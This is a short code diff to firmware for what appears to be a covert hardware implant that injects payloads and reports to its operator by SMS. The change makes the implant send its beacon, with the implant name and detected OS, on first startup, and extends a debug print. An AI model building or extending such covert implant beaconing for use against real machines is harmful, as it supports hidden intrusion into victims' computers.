@@ -24,6 +24,7 @@ unsigned long previousMillis = 0;
 unsigned long previousMillisBeacon = 0;
 unsigned long previousFailSMSMillis = 0;
 String os;
+bool firstExecution = true;
 
 
 #ifdef DEBUG
@@ -72,14 +73,16 @@ void loop(){
 
   // Send a beacon so we know that the implant is up
   // ToDo: this can infere with payloads execution. Use only when user is not typing
-  if (!pendingSMS && (unsigned long)((currentMillis - previousMillisBeacon)/ 60000) >= BEACON_TIME){
+  if (firstExecution || !pendingSMS && (unsigned long)((currentMillis - previousMillisBeacon)/ 60000) >= BEACON_TIME){
+      firstExecution = false;
       String msg = F("Beacon - ");
       msg += IMPLANT_NAME;
       msg += " (";
       msg += os; // add possible os in the beacon
       msg += ")";
 #ifdef DEBUG
-      Serial.println(F("Sending beacon"));
+      Serial.print(F("Sending beacon"));
+      Serial.println(msg);
 #endif
       sendSMSMessage(msg);
       previousMillisBeacon = currentMillis;
